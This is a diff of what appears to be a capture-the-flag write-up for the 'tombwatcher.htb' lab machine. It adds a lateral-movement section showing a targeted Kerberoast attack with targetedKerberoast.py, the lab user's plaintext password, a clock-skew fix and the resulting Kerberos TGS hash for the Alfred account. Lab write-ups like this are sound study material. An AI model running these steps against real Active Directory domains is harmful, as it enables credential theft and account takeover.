@@ -185,11 +185,9 @@ INFO: Compressing output into 20260924033424_bloodhound.zip
 ```
 
 ---
-## Foothold
+## Lateral movement from herny to alfred
 
-How you gained initial access to the machine.
-
-### Vulnerability
+### targeted kerberoast
 
 Description of the vulnerability exploited.
 
@@ -198,7 +196,37 @@ Description of the vulnerability exploited.
 Step-by-step exploitation with commands.
 
 ```shell
-# Commands used
+python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+Traceback (most recent call last):
+  File "/home/kali/tools/targetedKerberoast/targetedKerberoast.py", line 597, in main
+    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName=userName, password=args.auth_password, domain=args.auth_domain, lmhash=None, nthash=auth_nt_hash,
+                                             ~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                                                            aesKey=args.auth_aes_key, kdcHost=args.dc_ip)
+                                                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 323, in getKerberosTGT
+    tgt = sendReceive(encoder.encode(asReq), domain, kdcHost)
+  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 93, in sendReceive
+    raise krbError
+impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+                                                                                                                    
+┌──(kali㉿kali)-[~/tools/targetedKerberoast]
+└─$ sudo ntpdate tombwatcher.htb
+[sudo] password for kali: 
+2026-09-24 07:52:50.481026 (-0400) +14400.376862 +/- 0.022918 tombwatcher.htb 10.129.144.23 s1 no-leap
+CLOCK: time stepped by 14400.376862
+                                                                                                                    
+┌──(kali㉿kali)-[~/tools/targetedKerberoast]
+└─$ python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[VERBOSE] SPN added successfully for (Alfred)
+[+] Printing hash for (Alfred)
+$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$bfb3189a3daf3e1c3ea05b2b6f8a47ca$1decb5a4a107e8fc3c349f302ae17388a50cbdc4ecf4e99fb5cf48b5eccfe59f8d1e238ea3cd51d9df1c7a57fcb56fcbab697f0e33afef58217e617c81df10dd4036c3246026c6e01bd6696aa14595d4030ee0994dec5cb78acfbe0da923eb203a6dd09b4307705cff3e11dc8acb91b33aa8bcd57451e374a203038ae01aab7b5188af4e9b26e6abbd98dfd9c0ac960140250c6de273e596e6add5f2b2624bd2aae73b95de6d2f27ff1d6ffdfc6057bbe4169e490e264723f175f8ad05e8fac03253b6bcc6780c9eb1c26b25142a842d7ce8fd432222b14f267c0c899b148c651cf2e43ecc671c52e398b34af275f6c943b375ff10e316c6e25386b5333a51d86379b99c6f1b7eda4e0f90a793be1a24d982868a7fd571e2d974cd32ef8c7fb5076b1aa009bc198a52c97bdd9624ca59df789fbbfa5360f9f6c95a7270a26d385019c9017dbe479d38cc38e45ccc5bc89fe5ff57c30e949d48aeeb91944df54cb07ee2df01f53e90d6f8dca57cde899e34b4671fc14a7c5a14fda57b52c3e328d6442fb910594550988d4f462ca9a331d5813afbc5aec5005341fa6f2b4791ae8b2989a3f6c9868086c83e24d2f2361d0c3d78b0819da2b4054153fa845997c4f13e8bab6e0a445b3a50394b285475c7dabe9ec30b66b13329ec9701851c2bc811fdfc9c400c57f6980f2841323c47bffd061c7a1eba81a628ed2218fbf9134f1309b87077ea0c1fb1724348dff56b2625819543cef8ebf753c6b10be90bff518714135cb1200fc8d0590b0f2afa84f96affc5791be469f6830eef35c619dc1a0fa10774a23de41265262747d0f7cc74bae2e7ecf86d112c83dd082b5b54de3f30d118567112cb2d4a6a0050e0750c64c3c10cef0719118f9fb697fde5cdeaf9b1c0490c66560ce69fe6450854c71ef70453976559e46de6a451aaf75e822007c70cee7b78646da6c5b5387bb17504245032a06066542fa1c8c5092d7b14a81c3cb547e23858b41ebf499750a92c3ad84ee502aea8967dbab4e57e91faf6de511e7fd227dd885f8d579b0f303935200c7936cae6788d48741a5ba5e7ff3d8d86e8a72a8f11af2c871173a58494442a1a6070ee985dc96dc8b811121a6d40ba1ffdffe4e88771aa62841e43595b312aae0d050479b9ff8b9360441c076a3f08cb6aef5ada07b96e525196303797aa71bc7e6b898ed4e701ea3e4918f6012a8d425847b261fba060a486fa93236323c81f738191a85deda9d31a12f4125d291b00e0331ab82cc75994c59cfd6da6176a695722f02562aea36ffdd956961c69200e380c9deb2aefa338a6af1fd5aebe09d4b9b7760de634934d1eafb167ead277d0f71e84d661a6fc3e5ddfd544b04cb954594565ef4375b2ac3a4b986ed00434b3009626f238c610a21590ea43f3a2d0bec6174f6a535ef43e47ca4a84eacf99e13916cec7ce354c28651bc21494deba95c7beb2023c
+[VERBOSE] SPN removed successfully for (Alfred)
+
 ```
 
 ---
